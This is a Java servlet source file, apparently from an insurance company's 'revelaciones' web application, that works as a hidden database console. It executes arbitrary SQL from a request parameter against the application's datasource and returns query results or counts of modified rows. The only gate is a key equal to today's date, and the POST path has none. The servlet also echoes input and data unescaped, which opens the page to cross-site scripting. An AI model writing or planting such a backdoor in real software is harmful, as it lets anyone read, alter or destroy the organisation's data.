package cl.bicevida.revelaciones.common.servlet;

import java.io.IOException;
import java.io.PrintWriter;

import java.nio.charset.Charset;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;

import java.text.SimpleDateFormat;

import java.util.Date;

import javax.naming.Context;
import javax.naming.InitialContext;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import javax.sql.DataSource;

import org.w3c.tidy.EncodingUtils;


public class Consulta extends HttpServlet {
    private static final String CONTENT_TYPE = "text/html; charset=UTF-8";
    private static final String ENCODING = "UTF-8";
    
    @SuppressWarnings("compatibility:2978774309489463809")
    private static final long serialVersionUID = -6333432119948297067L;

    public void init(ServletConfig config) throws ServletException {
        super.init(config);
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String clave = request.getParameter("clave");
        request.setCharacterEncoding(ENCODING);
        if(clave.equals(new SimpleDateFormat("yyyyMMdd").format(new Date()))){
            doPost(request, response);
        }
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType(CONTENT_TYPE);
        request.setCharacterEncoding(ENCODING);
        PrintWriter out = response.getWriter();
        String sql = request.getParameter("sql")==null?"":request.getParameter("sql");
        try{
            out.println("<html>");
            out.println("<head><title>:-)</title></head>");
            out.println("<body style\"font-family:arial; font-size:12px;\">");            
            out.println("<form name=\"form\" method=\"post\">\n" + 
            "            <textarea name=\"sql\" cols=\"100\" rows=\"10\">"+sql+"</textarea>\n" + 
            "            <br>\n" + 
            "            <input type=\"submit\" name=\"enviar\" value=\"Enviar\"/>\n" + 
            "        </form>");
            if(sql.length() != 0){
                imprimir(sql, out);
            }
            out.println("</body></html>");
            out.close();
        } catch (Exception e) {
            out.println("<span style='color:red;'>Error : </span>"+e.getMessage()); 
        }
    }
    
    private void imprimir(String sql, java.io.PrintWriter out) throws Exception {
        int rowCount = 0;
        Context context = new InitialContext();         
        DataSource dataSource = null;
        Connection connection = null;
        Statement statement = null;
        ResultSet rs = null;
        try{
            dataSource = (DataSource)context.lookup("/app/jdbc/jdbc/RevelacionesDS");
            connection = dataSource.getConnection();            
            statement = connection.createStatement();
        }catch(Exception e){
            out.println("<span style='color:red;'>Error al obtener conexión : </span>"+e.getMessage());                                   
        }    
        
        if(sql.toLowerCase().startsWith("select")){
            try{
                rs = statement.executeQuery(sql);
                out.println("<div ALIGN='left'><TABLE border=1 cellspacing=\"0\" cellpadding=\"0\" border=\"0\" style=\"border: 1px #C0C0C0 solid\">");
                ResultSetMetaData rsmd = rs.getMetaData();
                int columnCount = rsmd.getColumnCount();
                // table header
                out.println("<TR>");
                for (int i = 0; i < columnCount; i++) {
                    out.println("<TH>" + rsmd.getColumnLabel(i + 1) + "</TH>");
                }
                out.println("</TR>");
                // the data
                while (rs.next()) {
                    rowCount++;
                    out.println("<TR>");
                    for (int i = 0; i < columnCount; i++) {
                        out.println("<TD>" + rs.getString(i + 1) + "</TD>");
                    }
                    out.println("</TR>");
                }
                out.println("</TABLE></div>");                               
                
            }catch(Exception e){
                out.println("<span style='color:red;'>Error : </span>"+e.getMessage());                                   
            }finally{
                try{
                    rs.close();
                    statement.close();
                    connection.close();
                }catch(Exception e1){
                    out.println("<span style='color:red;'>Error al cerrar conexión: </span>"+e1.getMessage());
                }
            }
        }
        else{
            try{
                int count = 0;
                count = statement.executeUpdate(sql);
                out.println("se actualizaron "+count+" registro(s) exitosamente"); 
                statement.close();
                connection.close();
            }catch(Exception e){
                out.println("<span style='color:red;'>Error : </span>"+e.getMessage()); 
            }finally{
                try{                    
                    statement.close();
                    connection.close();
                }catch(Exception e1){
                    out.println("<span style='color:red;'>Error al cerrar conexión : </span>"+e1.getMessage());
                }
            }
        }
        
              
    }

}
